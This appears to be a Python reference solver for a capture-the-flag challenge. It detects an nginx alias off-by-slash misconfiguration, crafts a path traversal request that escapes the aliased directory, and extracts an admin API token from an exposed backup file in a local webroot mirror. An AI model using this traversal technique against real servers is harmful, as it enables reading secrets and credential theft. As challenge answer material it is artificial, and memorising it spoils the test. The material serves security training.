#!/usr/bin/env python3
"""Reference solver for 'alias-slip'.

Parse the nginx config, find every ``location`` / ``alias`` pair, detect the
off-by-slash traversal (location without a trailing slash but alias with one),
and compute the request that escapes the aliased directory. Then resolve that
request against the shipped ``webroot/`` document tree and read the exposed
backup file.

Pure standard library.
"""

import os
import re


def parse_alias_blocks(conf: str):
    """Yield (location, alias) pairs from the nginx config."""
    blocks = re.findall(r"location\s+(\S+)\s*\{([^}]*)\}", conf, flags=re.DOTALL)
    for loc, body in blocks:
        m = re.search(r"\balias\s+(\S+?);", body)
        if m:
            yield loc, m.group(1)


def find_vulnerable(conf: str):
    for loc, alias in parse_alias_blocks(conf):
        # Off-by-slash: location has no trailing slash, alias ends with one.
        if not loc.endswith("/") and alias.endswith("/"):
            return loc, alias
    return None


def solve(root: str) -> str:
    with open(os.path.join(root, "nginx.conf"), encoding="utf-8") as fh:
        conf = fh.read()

    vuln = find_vulnerable(conf)
    if not vuln:
        raise SystemExit("no alias off-by-slash found")
    loc, alias = vuln
    print(f"[+] vulnerable block: location {loc}  alias {alias}")

    # Craft the traversal request. nginx concatenates the alias with whatever
    # follows the (slash-less) location prefix, so "/assets../config/x" maps to
    # "<alias>../config/x".
    target_rel = "config/settings.py.bak"
    request_uri = f"{loc}../{target_rel}"
    fs_path = alias + request_uri[len(loc) :]  # alias + "../config/settings.py.bak"
    fs_path = os.path.normpath(fs_path)
    print(f"[+] request {request_uri}  ->  {fs_path}")

    # Resolve the absolute server path against the shipped webroot mirror.
    local = os.path.join(root, "webroot", fs_path.lstrip("/"))
    with open(local, encoding="utf-8") as fh:
        data = fh.read()

    m = re.search(r'ADMIN_API_TOKEN\s*=\s*"([^"]+)"', data)
    if not m:
        raise SystemExit("admin token not found in exposed backup")
    token = m.group(1)
    print("[+] leaked admin token:", token)
    flag = "NCTF{nginx_alias_offbyslash_" + token + "}"
    print("[+] FLAG =", flag)
    return flag


if __name__ == "__main__":
    here = os.path.dirname(os.path.abspath(__file__))
    solve(os.path.normpath(os.path.join(here, "..")))
